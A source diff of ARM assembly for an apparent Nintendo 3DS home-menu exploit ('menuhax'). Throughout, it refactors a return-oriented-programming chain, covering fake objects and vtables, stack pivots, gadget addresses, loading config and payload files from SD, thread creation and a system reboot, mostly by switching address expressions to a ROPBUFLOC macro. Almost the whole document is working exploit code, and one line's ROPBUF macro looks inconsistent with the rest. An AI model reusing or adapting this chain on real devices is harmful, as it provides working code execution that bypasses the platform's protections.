@@ -12,21 +12,21 @@ ret2menu_exploitreturn_spaddr: @ The menuhax_loader writes the sp-addr to jump t
 .word 0
 
 .word POP_R0PC @ Stack-pivot to ropstackstart.
-.word HEAPBUF + (object - _start) @ r0
+.word ROPBUFLOC(object) @ r0
 
 .word ROP_LOADR4_FROMOBJR0
 
 object:
-.word HEAPBUF + (vtable - _start) @ object+0, vtable ptr
+.word ROPBUFLOC(vtable) @ object+0, vtable ptr
 .word 0
 .word 0
 .word 0
 
-.word HEAPBUF + ((object + 0x20) - _start) @ This .word is at object+0x10. ROP_LOADR4_FROMOBJR0 loads r4 from here.
+.word ROPBUFLOC(object + 0x20) @ This .word is at object+0x10. ROP_LOADR4_FROMOBJR0 loads r4 from here.
 
 .space ((object + 0x1c) - .) @ sp/pc data loaded by STACKPIVOT_ADR.
 stackpivot_sploadword:
-.word HEAPBUF + (ropstackstart - _start) @ sp
+.word ROPBUFLOC(ropstackstart) @ sp
 stackpivot_pcloadword:
 .word ROP_POPPC @ pc
 
@@ -105,6 +105,10 @@ menuhax_cfg_new:
 .space 0x2c
 #endif
 
+ropkit_cmpobject:
+.word (ROPBUFLOC(ropkit_cmpobject) + 0x4) @ Vtable-ptr
+.fill (0x40 / 4), 4, STACKPIVOT_ADR @ Vtable
+
 tmp_scratchdata:
 .space 0x400
 
@@ -113,16 +117,16 @@ ropstackstart:
 
 #ifdef LOADSDCFG
 @ Load the cfg file. Errors are ignored with file-reading.
-CALLFUNC_NOSP MEMSET32_OTHER, (HEAPBUF + (IFile_ctx - _start)), 0x20, 0, 0
+CALLFUNC_NOSP MEMSET32_OTHER, ROPBUFLOC(IFile_ctx), 0x20, 0, 0
 
-CALLFUNC_NOSP IFile_Open, (HEAPBUF + (IFile_ctx - _start)), (HEAPBUF + (sdfile_cfg_path - _start)), 1, 0
+CALLFUNC_NOSP IFile_Open, ROPBUFLOC(IFile_ctx), ROPBUFLOC(sdfile_cfg_path), 1, 0
 
-CALLFUNC_NOSP IFile_Read, (HEAPBUF + (IFile_ctx - _start)), (HEAPBUF + (tmp_scratchdata - _start)), (HEAPBUF + (menuhax_cfg - _start)), 0x2c
+CALLFUNC_NOSP IFile_Read,ROPBUFLOC(IFile_ctx), ROPBUFLOC(tmp_scratchdata), ROPBUFLOC(menuhax_cfg), 0x2c
 
 ROP_SETLR ROP_POPPC
 
 .word POP_R0PC
-.word (HEAPBUF + (IFile_ctx - _start))
+.word ROPBUFLOC(IFile_ctx)
 
 .word ROP_LDR_R0FROMR0
 
@@ -130,24 +134,24 @@ ROP_SETLR ROP_POPPC
 
 @ Verify that the cfg version matches 0x3. On match continue running the below ROP, otherwise jump to rop_cfg_end. Mismatch can also be caused by file-reading failing.
 ROP_SETLR ROP_POPPC
-ROPMACRO_CMPDATA (HEAPBUF + ((menuhax_cfg+0x0) - _start)), 0x3, (HEAPBUF + (rop_cfg_end - _start)), 0x0
+ROPMACRO_CMPDATA ROPBUFLOC(menuhax_cfg+0x0), 0x3, ROPBUFLOC(rop_cfg_end)
 
 @ Copy the u64 from filebuf+0x14 to hblauncher_svcsleepthread_delaylow/hblauncher_svcsleepthread_delayhigh.
-ROPMACRO_COPYWORD (HEAPBUF + (hblauncher_svcsleepthread_delaylow - _start)), (HEAPBUF + ((menuhax_cfg+0x14) - _start))
-ROPMACRO_COPYWORD (HEAPBUF + (hblauncher_svcsleepthread_delayhigh - _start)), (HEAPBUF + ((menuhax_cfg+0x18) - _start))
+ROPMACRO_COPYWORD ROPBUFLOC(hblauncher_svcsleepthread_delaylow), ROPBUFLOC(menuhax_cfg+0x14)
+ROPMACRO_COPYWORD ROPBUFLOC(hblauncher_svcsleepthread_delayhigh), ROPBUFLOC(menuhax_cfg+0x18)
 
 @ Copy the u64 from filebuf+0x24 to newthread_svcsleepthread_delaylow/newthread_svcsleepthread_delayhigh.
-ROPMACRO_COPYWORD (HEAPBUF + (newthread_svcsleepthread_delaylow - _start)), (HEAPBUF + ((menuhax_cfg+0x24) - _start))
-ROPMACRO_COPYWORD (HEAPBUF + (newthread_svcsleepthread_delayhigh - _start)), (HEAPBUF + ((menuhax_cfg+0x28) - _start))
+ROPMACRO_COPYWORD ROPBUFLOC(newthread_svcsleepthread_delaylow), ROPBUFLOC(menuhax_cfg+0x24)
+ROPMACRO_COPYWORD ROPBUFLOC(newthread_svcsleepthread_delayhigh), ROPBUFLOC(menuhax_cfg+0x28)
 
 rop_cfg_cmpbegin_exectypestart: @ Compare u32 filebuf+0x10(exec_type) with 0x0, on match continue to the ROP following this(which jumps to rop_cfg_cmpbegin1), otherwise jump to rop_cfg_cmpbegin_exectypeprepare.
 ROP_SETLR ROP_POPPC
-ROPMACRO_CMPDATA (HEAPBUF + ((menuhax_cfg+0x10) - _start)), 0x0, (HEAPBUF + (rop_cfg_cmpbegin_exectypeprepare - _start)), 0x0
-ROPMACRO_STACKPIVOT (HEAPBUF + (rop_cfg_cmpbegin1 - _start)), ROP_POPPC
+ROPMACRO_CMPDATA ROPBUFLOC(menuhax_cfg+0x10), 0x0, ROPBUFLOC(rop_cfg_cmpbegin_exectypeprepare)
+ROPMACRO_STACKPIVOT ROPBUFLOC(rop_cfg_cmpbegin1), ROP_POPPC
 
 rop_cfg_cmpbegin_exectypeprepare:
 
-CALLFUNC_NOSP MEMCPY, (HEAPBUF + ((menuhax_cfg_new) - _start)), (HEAPBUF + ((menuhax_cfg) - _start)), 0x2c, 0
+CALLFUNC_NOSP MEMCPY, ROPBUFLOC(menuhax_cfg_new), ROPBUFLOC(menuhax_cfg), 0x2c, 0
 
 ROP_SETLR ROP_POPPC
 
@@ -155,22 +159,22 @@ ROP_SETLR ROP_POPPC
 .word 0x0 @ r0
 
 .word POP_R1PC
-.word (HEAPBUF + ((menuhax_cfg_new+0x10) - _start)) @ r1
+.word ROPBUFLOC(menuhax_cfg_new+0x10) @ r1
 
 .word ROP_STR_R0TOR1 @ Write 0x0 to cfg exec_type.
 
 @ Write the updated cfg to the file.
 
-CALLFUNC_NOSP MEMSET32_OTHER, (HEAPBUF + (IFile_ctx - _start)), 0x20, 0, 0
+CALLFUNC_NOSP MEMSET32_OTHER, ROPBUFLOC(IFile_ctx), 0x20, 0, 0
 
-CALLFUNC_NOSP IFile_Open, (HEAPBUF + (IFile_ctx - _start)), (HEAPBUF + (sdfile_cfg_path - _start)), 0x3, 0
+CALLFUNC_NOSP IFile_Open, ROPBUFLOC(IFile_ctx), ROPBUFLOC(sdfile_cfg_path), 0x3, 0
 
-CALLFUNC IFile_Write, (HEAPBUF + (IFile_ctx - _start)), (HEAPBUF + (tmp_scratchdata - _start)), (HEAPBUF + (menuhax_cfg_new - _start)), 0x2c, 1, 0, 0, 0
+CALLFUNC IFile_Write, ROPBUFLOC(IFile_ctx), ROPBUFLOC(tmp_scratchdata), ROPBUFLOC(menuhax_cfg_new), 0x2c, 1, 0, 0, 0
 
 ROP_SETLR ROP_POPPC
 
 .word POP_R0PC
-.word (HEAPBUF + (IFile_ctx - _start))
+.word ROPBUFLOC(IFile_ctx)
 
 .word ROP_LDR_R0FROMR0
 
@@ -178,52 +182,52 @@ ROP_SETLR ROP_POPPC
 
 @ Compare u32 filebuf+0x10(exec_type) with 0x1, on match continue to the ROP following this, otherwise jump to rop_cfg_cmpbegin_exectype2.
 ROP_SETLR ROP_POPPC
-ROPMACRO_CMPDATA (HEAPBUF + ((menuhax_cfg+0x10) - _start)), 0x1, (HEAPBUF + (rop_cfg_cmpbegin_exectype2 - _start)), 0x0
+ROPMACRO_CMPDATA ROPBUFLOC(menuhax_cfg+0x10), 0x1, ROPBUFLOC(rop_cfg_cmpbegin_exectype2)
 
 @ Jump to padcheck_finish.
-ROPMACRO_STACKPIVOT (HEAPBUF + (padcheck_finish - _start)), ROP_POPPC
+ROPMACRO_STACKPIVOT ROPBUFLOC(padcheck_finish), ROP_POPPC
 
 rop_cfg_cmpbegin_exectype2: @ Compare u32 filebuf+0x10(exec_type) with 0x2, on match continue to the ROP following this, otherwise jump to rop_cfg_cmpbegin1.
 ROP_SETLR ROP_POPPC
-ROPMACRO_CMPDATA (HEAPBUF + ((menuhax_cfg+0x10) - _start)), 0x2, (HEAPBUF + (rop_cfg_cmpbegin1 - _start)), 0x0
+ROPMACRO_CMPDATA ROPBUFLOC(menuhax_cfg+0x10), 0x2, ROPBUFLOC(rop_cfg_cmpbegin1)
 
-ROPMACRO_STACKPIVOT (HEAPBUF + (ret2menu_rop - _start)), ROP_POPPC
+ROPMACRO_STACKPIVOT ROPBUFLOC(ret2menu_rop), ROP_POPPC
 
 rop_cfg_cmpbegin1: @ Compare u32 filebuf+0x4 with 0x1, on match continue to the ROP following this, otherwise jump to rop_cfg_cmpbegin2.
 ROP_SETLR ROP_POPPC
 
-ROPMACRO_CMPDATA (HEAPBUF + ((menuhax_cfg+0x4) - _start)), 0x1, (HEAPBUF + (rop_cfg_cmpbegin2 - _start)), 0x0
+ROPMACRO_CMPDATA ROPBUFLOC(menuhax_cfg+0x4), 0x1, ROPBUFLOC(rop_cfg_cmpbegin2)
 
 ROP_SETLR ROP_POPPC
 
 .word POP_R0PC
-.word (HEAPBUF + (rop_r1data_cmphid - _start)) @ r0
+.word ROPBUFLOC(rop_r1data_cmphid) @ r0
 
 .word POP_R1PC
-.word (HEAPBUF + ((menuhax_cfg+0x8) - _start)) @ r1
+.word ROPBUFLOC(menuhax_cfg+0x8) @ r1
 
 .word ROP_LDRR1R1_STRR1R0 @ Copy the u32 from filebuf+0x8 to rop_r1data_cmphid, for overwriting the USE_PADCHECK value.
 
 @ This ROP chunk has finished, jump to rop_cfg_end.
-ROPMACRO_STACKPIVOT (HEAPBUF + (rop_cfg_end - _start)), ROP_POPPC
+ROPMACRO_STACKPIVOT ROPBUFLOC(rop_cfg_end), ROP_POPPC
 
 rop_cfg_cmpbegin2: @ Compare u32 filebuf+0x4 with 0x2, on match continue to the ROP following this, otherwise jump to rop_cfg_end.
 ROP_SETLR ROP_POPPC
 
-ROPMACRO_CMPDATA (HEAPBUF + ((menuhax_cfg+0x4) - _start)), 0x2, (HEAPBUF + (rop_cfg_end - _start)), 0x0
+ROPMACRO_CMPDATA ROPBUFLOC(menuhax_cfg+0x4), 0x2, ROPBUFLOC(rop_cfg_end)
 
 @ This type is the same as type1(minus the offset the PAD value is loaded from), except that it basically inverts the padcheck: on PAD match ret2menu, on mismatch continue ROP.
 
 .word POP_R0PC
-.word (HEAPBUF + (rop_r1data_cmphid - _start)) @ r0
+.word ROPBUFLOC(rop_r1data_cmphid) @ r0
 
 .word POP_R1PC
-.word (HEAPBUF + ((menuhax_cfg+0xc) - _start)) @ r1
+.word ROPBUFLOC(menuhax_cfg+0xc) @ r1
 
 .word ROP_LDRR1R1_STRR1R0 @ Copy the u32 from filebuf+0xc to rop_r1data_cmphid, for overwriting the USE_PADCHECK value.
 
 .word POP_R0PC
-.word (HEAPBUF + ((padcheck_end_stackpivotskip) - _start)) @ r0
+.word ROPBUFLOC(padcheck_end_stackpivotskip) @ r0
 
 .word POP_R1PC
 .word ROP_POPPC @ r1
@@ -231,7 +235,7 @@ ROPMACRO_CMPDATA (HEAPBUF + ((menuhax_cfg+0x4) - _start)), 0x2, (HEAPBUF + (rop_
 .word ROP_STR_R1TOR0 @ Write ROP_POPPC to padcheck_end_stackpivotskip, so that the stack-pivot following that actually gets executed.
 
 .word POP_R0PC
-.word (HEAPBUF + ((padcheck_pc_value) - _start)) @ r0
+.word ROPBUFLOC(padcheck_pc_value) @ r0
 
 .word POP_R1PC
 .word ROP_POPPC @ r1
@@ -239,10 +243,10 @@ ROPMACRO_CMPDATA (HEAPBUF + ((menuhax_cfg+0x4) - _start)), 0x2, (HEAPBUF + (rop_
 .word ROP_STR_R1TOR0 @ Write ROP_POPPC to padcheck_pc_value.
 
 .word POP_R0PC
-.word (HEAPBUF + ((padcheck_sp_value) - _start)) @ r0
+.word ROPBUFLOC(padcheck_sp_value) @ r0
 
 .word POP_R1PC
-.word (HEAPBUF + ((padcheck_finish) - _start)) @ r1
+.word ROPBUFLOC(padcheck_finish) @ r1
 
 .word ROP_STR_R1TOR0 @ Write the address of padcheck_finish to padcheck_sp_value.
 
@@ -252,7 +256,7 @@ rop_cfg_end:
 ROP_SETLR ROP_POPPC
 
 .word POP_R0PC
-.word HEAPBUF + (rop_r0data_cmphid - _start) @ r0
+.word ROPBUFLOC(rop_r0data_cmphid) @ r0
 
 .word POP_R1PC
 .word 0x1000001c @ r1
@@ -269,19 +273,19 @@ rop_r1data_cmphid:
 
 .word ROP_CMPR0R1 @ Compare current PAD state with USE_PADCHECK value.
 
-.word HEAPBUF + ((object+0x20) - _start) @ r4
+.word ROPBUFLOC(object+0x20) @ r4
 
 .word POP_R0PC
-.word HEAPBUF + (stackpivot_sploadword - _start) @ r0
+.word ROPBUFLOC(stackpivot_sploadword) @ r0
 
 .word POP_R1PC
 padcheck_sp_value:
-.word (HEAPBUF + (ret2menu_rop - _start)) @ r1
+.word ROPBUFLOC(ret2menu_rop) @ r1
 
 .word ROP_STR_R1TOR0 @ Write to the word which will be popped into sp.
 
 .word POP_R0PC
-.word HEAPBUF + (stackpivot_pcloadword - _start) @ r0
+.word ROPBUFLOC(stackpivot_pcloadword) @ r0
 
 .word POP_R1PC
 padcheck_pc_value:
@@ -290,7 +294,7 @@ padcheck_pc_value:
 .word ROP_STR_R1TOR0 @ Write to the word which will be popped into pc.
 
 .word POP_R0PC @ Begin the actual stack-pivot ROP.
-.word HEAPBUF + (object - _start) @ r0
+.word ROPBUFLOC(object) @ r0
 
 .word ROP_LOADR4_FROMOBJR0+8 @ When the current PAD state matches the USE_PADCHECK value, continue the ROP, otherwise do the above stack-pivot to return to the home-menu code.
 
@@ -298,15 +302,15 @@ padcheck_pc_value:
 
 @ Re-init the stack-pivot data since this is needed for the sdcfg stuff.
 .word POP_R0PC
-.word HEAPBUF + (stackpivot_sploadword - _start) @ r0
+.word ROPBUFLOC(stackpivot_sploadword) @ r0
 
 .word POP_R1PC
-.word (HEAPBUF + (ret2menu_rop - _start)) @ r1
+.word ROPBUFLOC(ret2menu_rop) @ r1
 
 .word ROP_STR_R1TOR0 @ Write to the word which will be popped into sp.
 
 .word POP_R0PC
-.word HEAPBUF + (stackpivot_pcloadword - _start) @ r0
+.word ROPBUFLOC(stackpivot_pcloadword) @ r0
 
 .word POP_R1PC
 .word ROP_POPPC @ r1
@@ -318,50 +322,50 @@ padcheck_end_stackpivotskip:
 
 @ When actually executed, stack-pivot so that ret2menu is done.
 .word POP_R0PC
-.word HEAPBUF + (object - _start) @ r0
+.word ROPBUFLOC(object) @ r0
 
 .word ROP_LOADR4_FROMOBJR0
 
 padcheck_finish:
-ROPMACRO_STACKPIVOT (HEAPBUF + (padcheck_finish_jump - _start)), ROP_POPPC
+ROPMACRO_STACKPIVOT ROPBUFLOC(padcheck_finish_jump), ROP_POPPC
 
 ret2menu_rop:
 
 #ifdef LOADSDCFG
 @ When u32 cfg+0x20 != 0x0, goto to ret2menu_rop_createthread, otherwise jump to ret2menu_rop_returnmenu.
-ROPMACRO_CMPDATA (HEAPBUF + ((menuhax_cfg+0x20) - _start)), 0x0, (HEAPBUF + (ret2menu_rop_createthread - _start)), 0x0
-ROPMACRO_STACKPIVOT (HEAPBUF + (ret2menu_rop_returnmenu - _start)), ROP_POPPC
+ROPMACRO_CMPDATA ROPBUFLOC(menuhax_cfg+0x20), 0x0, ROPBUFLOC(ret2menu_rop_createthread)
+ROPMACRO_STACKPIVOT ROPBUFLOC(ret2menu_rop_returnmenu), ROP_POPPC
 
 ret2menu_rop_createthread:
 ROP_SETLR ROP_POPPC
 
 .word POP_R0PC
-.word (HEAPBUF + (newthread_rop_r1data_cmphid - _start)) @ r0
+.word ROPBUFLOC(newthread_rop_r1data_cmphid) @ r0
 
 .word POP_R1PC
-.word (HEAPBUF + ((menuhax_cfg+0x20) - _start)) @ r1
+.word ROPBUFLOC(menuhax_cfg+0x20) @ r1
 
 .word ROP_LDRR1R1_STRR1R0 @ Copy the u32 from cfg+0x20 to newthread_rop_r1data_cmphid.
 
-CALLFUNC svcControlMemory, (HEAPBUF + (tmp_scratchdata - _start)), NEWTHREAD_ROPBUFFER, 0, (((newthread_ropend - newthread_ropstart) + 0xfff) & ~0xfff), 0x3, 0x3, 0, 0
+CALLFUNC svcControlMemory, ROPBUFLOC(tmp_scratchdata), NEWTHREAD_ROPBUFFER, 0, (((newthread_ropend - newthread_ropstart) + 0xfff) & ~0xfff), 0x3, 0x3, 0, 0
 
-CALLFUNC_NOSP MEMCPY, NEWTHREAD_ROPBUFFER, (HEAPBUF + (newthread_ropstart - _start)), (newthread_ropend - newthread_ropstart), 0
+CALLFUNC_NOSP MEMCPY, NEWTHREAD_ROPBUFFER, ROPBUFLOC(newthread_ropstart), (newthread_ropend - newthread_ropstart), 0
 
 @ svcCreateThread(<tmp_scratchdata addr>, ROP_POPPC, 0, NEWTHREAD_ROPBUFFER, 28, -2);
 
-CALLFUNC svcCreateThread, (HEAPBUF + (tmp_scratchdata - _start)), ROP_POPPC, 0, NEWTHREAD_ROPBUFFER, 45, -2, 0, 0
+CALLFUNC svcCreateThread, ROPBUFLOC(tmp_scratchdata), ROP_POPPC, 0, NEWTHREAD_ROPBUFFER, 45, -2, 0, 0
 #endif
 
 ret2menu_rop_returnmenu:
 
 @ Pivot to the sp-addr from ret2menu_exploitreturn_spaddr.
 
-ROPMACRO_COPYWORD (HEAPBUF + (stackpivot_sploadword - _start)), (HEAPBUF + (ret2menu_exploitreturn_spaddr - _start))
+ROPMACRO_COPYWORD ROPBUFLOC(stackpivot_sploadword), ROPBUFLOC(ret2menu_exploitreturn_spaddr)
 
-ROPMACRO_WRITEWORD (HEAPBUF + (stackpivot_pcloadword - _start)), ROP_POPPC
+ROPMACRO_WRITEWORD ROPBUFLOC(stackpivot_pcloadword), ROP_POPPC
 
 .word POP_R0PC
-.word HEAPBUF + (object - _start) @ r0
+.word ROPBUFLOC(object) @ r0
 
 .word ROP_LOADR4_FROMOBJR0
 
@@ -374,36 +378,36 @@ CALL_GXCMD4 0x1f000000, 0x1f1e6000, 0x46800*2
 #else
 
 @ Allocate the buffer containing the gfx data in linearmem, with the bufptr located @ tmp_scratchdata+4, which is then copied to tmp_scratchdata+8.
-CALLFUNC svcControlMemory, (HEAPBUF + (tmp_scratchdata+4 - _start)), 0, 0, (((0x46800*2 + 0x38800) + 0xfff) & ~0xfff), 0x10003, 0x3, 0, 0
-ROPMACRO_COPYWORD (HEAPBUF + (tmp_scratchdata+8 - _start)), (HEAPBUF + (tmp_scratchdata+4 - _start))
+CALLFUNC svcControlMemory, ROPBUFLOC(tmp_scratchdata+4), 0, 0, (((0x46800*2 + 0x38800) + 0xfff) & ~0xfff), 0x10003, 0x3, 0, 0
+ROPMACRO_COPYWORD ROPBUFLOC(tmp_scratchdata+8), ROPBUFLOC(tmp_scratchdata+4)
 
 @ Initialize the data which will be copied into the framebuffers, for when reading the file fails.
 
 @ Clear the entire buffer, including the sub-screen data just to make sure it's all-zero initially.
-CALLFUNC_NOSP_LDRR0 MEMSET32_OTHER, (HEAPBUF + (tmp_scratchdata+8 - _start)), ((0x46800*2) + 0x38800), 0, 0
+CALLFUNC_NOSP_LDRR0 MEMSET32_OTHER, ROPBUFLOC(tmp_scratchdata+8), ((0x46800*2) + 0x38800), 0, 0
 
-CALLFUNC_NOSP_LDRR0 MEMCPY, (HEAPBUF + (tmp_scratchdata+8 - _start)), 0x1f000000, (0x46800*2), 0
+CALLFUNC_NOSP_LDRR0 MEMCPY, ROPBUFLOC(tmp_scratchdata+8), 0x1f000000, (0x46800*2), 0
 
 #ifdef ENABLE_IMAGEDISPLAY_SD
-CALLFUNC_NOSP MEMSET32_OTHER, (HEAPBUF + (IFile_ctx - _start)), 0x20, 0, 0
+CALLFUNC_NOSP MEMSET32_OTHER, ROPBUFLOC(IFile_ctx), 0x20, 0, 0
 
-CALLFUNC_NOSP IFile_Open, (HEAPBUF + (IFile_ctx - _start)), (HEAPBUF + (sdfile_imagedisplay_path - _start)), 1, 0
+CALLFUNC_NOSP IFile_Open, ROPBUFLOC(IFile_ctx), ROPBUFLOC(sdfile_imagedisplay_path), 1, 0
 
 @ Read main-screen 3D-left image.
-CALLFUNC_NOSP_LOADR2 IFile_Read, (HEAPBUF + (IFile_ctx - _start)), (HEAPBUF + (tmp_scratchdata - _start)), (HEAPBUF + (tmp_scratchdata+8 - _start)), (0x46500)
+CALLFUNC_NOSP_LOADR2 IFile_Read, ROPBUFLOC(IFile_ctx), ROPBUFLOC(tmp_scratchdata), ROPBUFLOC(tmp_scratchdata+8), (0x46500)
 
 @ Read main-screen 3D-right image.
-ROPMACRO_LDDRR0_ADDR1_STRADDR (HEAPBUF + (tmp_scratchdata+8 - _start)), (HEAPBUF + (tmp_scratchdata+8 - _start)), 0x46800
-CALLFUNC_NOSP_LOADR2 IFile_Read, (HEAPBUF + (IFile_ctx - _start)), (HEAPBUF + (tmp_scratchdata - _start)), (HEAPBUF + (tmp_scratchdata+8 - _start)), (0x46500)
+ROPMACRO_LDDRR0_ADDR1_STRADDR ROPBUFLOC(tmp_scratchdata+8), ROPBUFLOC(tmp_scratchdata+8), 0x46800
+CALLFUNC_NOSP_LOADR2 IFile_Read, ROPBUFLOC(IFile_ctx), ROPBUFLOC(tmp_scratchdata), ROPBUFLOC(tmp_scratchdata+8), (0x46500)
 
 @ Read sub-screen image.
-ROPMACRO_LDDRR0_ADDR1_STRADDR (HEAPBUF + (tmp_scratchdata+8 - _start)), (HEAPBUF + (tmp_scratchdata+8 - _start)), 0x46800
-CALLFUNC_NOSP_LOADR2 IFile_Read, (HEAPBUF + (IFile_ctx - _start)), (HEAPBUF + (tmp_scratchdata - _start)), (HEAPBUF + (tmp_scratchdata+8 - _start)), (0x38400)
+ROPMACRO_LDDRR0_ADDR1_STRADDR ROPBUFLOC(tmp_scratchdata+8), ROPBUFLOC(tmp_scratchdata+8), 0x46800
+CALLFUNC_NOSP_LOADR2 IFile_Read, ROPBUFLOC(IFile_ctx), ROPBUFLOC(tmp_scratchdata), ROPBUFLOC(tmp_scratchdata+8), (0x38400)
 
 ROP_SETLR ROP_POPPC
 
 .word POP_R0PC
-.word (HEAPBUF + (IFile_ctx - _start))
+.word ROPBUFLOC(IFile_ctx)
 
 .word ROP_LDR_R0FROMR0
 
@@ -423,43 +427,43 @@ CALLFUNC GSP_SHAREDMEM_SETUPFRAMEBUF, 1, 1, 0x1f48f000 + 0x38800, 0, 0x2d0, 0x30
 
 
 @ Flush gfx dcache.
-CALLFUNC_NOSP_LDRR0 GSPGPU_FlushDataCache, (HEAPBUF + (tmp_scratchdata+4 - _start)), (0x46800*2) + 0x38800, 0, 0
+CALLFUNC_NOSP_LDRR0 GSPGPU_FlushDataCache, ROPBUFLOC(tmp_scratchdata+4), (0x46800*2) + 0x38800, 0, 0
 
-ROPMACRO_COPYWORD (HEAPBUF + (tmp_scratchdata+8 - _start)), (HEAPBUF + (tmp_scratchdata+4 - _start))
+ROPMACRO_COPYWORD ROPBUFLOC(tmp_scratchdata+8), ROPBUFLOC(tmp_scratchdata+4)
 
 @ Copy the gfx to the primary/secondary main-screen framebuffers.
-CALL_GXCMD4_LDRSRC (HEAPBUF + (tmp_scratchdata+8 - _start)), 0x1f1e6000, 0x46800*2
-CALL_GXCMD4_LDRSRC (HEAPBUF + (tmp_scratchdata+8 - _start)), 0x1f273000, 0x46800*2
+CALL_GXCMD4_LDRSRC ROPBUFLOC(tmp_scratchdata+8), 0x1f1e6000, 0x46800*2
+CALL_GXCMD4_LDRSRC ROPBUFLOC(tmp_scratchdata+8), 0x1f273000, 0x46800*2
 
 @ Copy the gfx to the primary/secondary sub-screen framebuffers.
-ROPMACRO_LDDRR0_ADDR1_STRADDR (HEAPBUF + (tmp_scratchdata+8 - _start)), (HEAPBUF + (tmp_scratchdata+8 - _start)), 0x46800*2
+ROPMACRO_LDDRR0_ADDR1_STRADDR ROPBUFLOC(tmp_scratchdata+8), ROPBUFLOC(tmp_scratchdata+8), 0x46800*2
 
-CALL_GXCMD4_LDRSRC (HEAPBUF + (tmp_scratchdata+8 - _start)), 0x1f48f000, 0x38800
-CALL_GXCMD4_LDRSRC (HEAPBUF + (tmp_scratchdata+8 - _start)), 0x1f48f000 + 0x38800, 0x38800
+CALL_GXCMD4_LDRSRC ROPBUFLOC(tmp_scratchdata+8), 0x1f48f000, 0x38800
+CALL_GXCMD4_LDRSRC ROPBUFLOC(tmp_scratchdata+8), 0x1f48f000 + 0x38800, 0x38800
 
 @ Wait 0.1s for the above transfers to finish, then free the allocated linearmem buffer.
 
 CALLFUNC_NOSP svcSleepThread, 100000000, 0, 0, 0
 
-CALLFUNC_LDRR1 svcControlMemory, (HEAPBUF + (tmp_scratchdata+12 - _start)), (HEAPBUF + (tmp_scratchdata+4 - _start)), 0, (((0x46800*2 + 0x38800) + 0xfff) & ~0xfff), 0x1, 0x0, 0, 0
+CALLFUNC_LDRR1 svcControlMemory, ROPBUFLOC(tmp_scratchdata+12), ROPBUFLOC(tmp_scratchdata+4), 0, (((0x46800*2 + 0x38800) + 0xfff) & ~0xfff), 0x1, 0x0, 0, 0
 #endif
 
 #ifdef ENABLE_LOADROPBIN
 #ifndef LOADSDPAYLOAD
-CALLFUNC_NOSP MEMCPY, ROPBIN_BUFADR, (HEAPBUF + ((codebinpayload_start) - _start)), (codedataend-codebinpayload_start), 0
+CALLFUNC_NOSP MEMCPY, ROPBIN_BUFADR, ROPBUFLOC(codebinpayload_start), (codedataend-codebinpayload_start), 0
 #else
-CALLFUNC_NOSP MEMSET32_OTHER, (HEAPBUF + (IFile_ctx - _start)), 0x20, 0, 0
+CALLFUNC_NOSP MEMSET32_OTHER, ROPBUFLOC(IFile_ctx), 0x20, 0, 0
 
-CALLFUNC_NOSP IFile_Open, (HEAPBUF + (IFile_ctx - _start)), (HEAPBUF + (sdfile_ropbin_path - _start)), 1, 0
+CALLFUNC_NOSP IFile_Open, ROPBUFLOC(IFile_ctx), ROPBUFLOC(sdfile_ropbin_path), 1, 0
 COND_THROWFATALERR
 
-CALLFUNC_NOSP IFile_Read, (HEAPBUF + (IFile_ctx - _start)), (HEAPBUF + (tmp_scratchdata - _start)), ROPBIN_BUFADR, 0x10000
+CALLFUNC_NOSP IFile_Read, ROPBUFLOC(IFile_ctx), ROPBUFLOC(tmp_scratchdata), ROPBIN_BUFADR, 0x10000
 COND_THROWFATALERR
 
 ROP_SETLR ROP_POPPC
 
 .word POP_R0PC
-.word (HEAPBUF + (IFile_ctx - _start))
+.word ROPBUFLOC(IFile_ctx)
 
 .word ROP_LDR_R0FROMR0
 
@@ -502,7 +506,7 @@ ROP_SETLR ROP_POPPC
 .word svcSleepThread @ Sleep 3 seconds, otherwise PADCHECK won't work if USE_PADCHECK and GAMECARD_PADCHECK are different values.
 
 .word POP_R0PC
-.word HEAPBUF + (rop_r0data_cmphid_gamecard - _start) @ r0
+.word ROPBUFLOC(rop_r0data_cmphid_gamecard) @ r0
 
 .word POP_R1PC
 .word 0x1000001c @ r1
@@ -518,18 +522,18 @@ rop_r0data_cmphid_gamecard:
 
 .word ROP_CMPR0R1 @ Compare current PAD state with GAMECARD_PADCHECK value.
 
-.word HEAPBUF + ((object+0x20) - _start) @ r4
+.word ROPBUFLOC(object+0x20) @ r4
 
 .word POP_R0PC
-.word HEAPBUF + (stackpivot_sploadword - _start) @ r0
+.word ROPBUFLOC(stackpivot_sploadword) @ r0
 
 .word POP_R1PC
-.word (HEAPBUF + (bootgamecard_ropfinish - _start)) @ r1
+.word ROPBUF(bootgamecard_ropfinish) @ r1
 
 .word ROP_STR_R1TOR0 @ Write to the word which will be popped into sp.
 
 .word POP_R0PC
-.word HEAPBUF + (stackpivot_pcloadword - _start) @ r0
+.word ROPBUFLOC(stackpivot_pcloadword) @ r0
 
 .word POP_R1PC
 .word ROP_POPPC @ r1
@@ -537,14 +541,14 @@ rop_r0data_cmphid_gamecard:
 .word ROP_STR_R1TOR0 @ Write to the word which will be popped into pc.
 
 .word POP_R0PC @ Begin the actual stack-pivot ROP.
-.word HEAPBUF + (object - _start) @ r0
+.word ROPBUFLOC(object) @ r0
 
 .word ROP_LOADR4_FROMOBJR0+8 @ When the current PAD state matches the GAMECARD_PADCHECK value, continue the gamecard launch ROP, otherwise do the above stack-pivot to skip gamecard launch.
 
 .word 0, 0, 0 @ r4..r6
 #endif
 
-CALLFUNC_NOSP NSS_RebootSystem, 0x1, (HEAPBUF + (gamecard_titleinfo - _start)), 0x0, 0
+CALLFUNC_NOSP NSS_RebootSystem, 0x1, ROPBUFLOC(gamecard_titleinfo), 0x0, 0
 
 bootgamecard_ropfinish:
 #endif
@@ -552,34 +556,34 @@ bootgamecard_ropfinish:
 #ifndef ENABLE_LOADROPBIN
 
 #if NEW3DS==1 //On New3DS the end-address of the GPU-accessible FCRAM area increased, relative to the SYSTEM-memregion end address. Therefore, in order to get the below process to run under memory that's GPU accessible, 0x400000-bytes are allocated here.
-CALLFUNC svcControlMemory, (HEAPBUF + (tmp_scratchdata - _start)), 0x0f000000, 0, 0x00400000, 0x3, 0x3, 0, 0
+CALLFUNC svcControlMemory, ROPBUFLOC(tmp_scratchdata), 0x0f000000, 0, 0x00400000, 0x3, 0x3, 0, 0
 #endif
 
 #ifdef LOADSDPAYLOAD//When enabled, load the file from SD to codebinpayload_start.
-CALLFUNC_NOSP MEMSET32_OTHER, (HEAPBUF + (IFile_ctx - _start)), 0x20, 0, 0
+CALLFUNC_NOSP MEMSET32_OTHER, ROPBUFLOC(IFile_ctx), 0x20, 0, 0
 
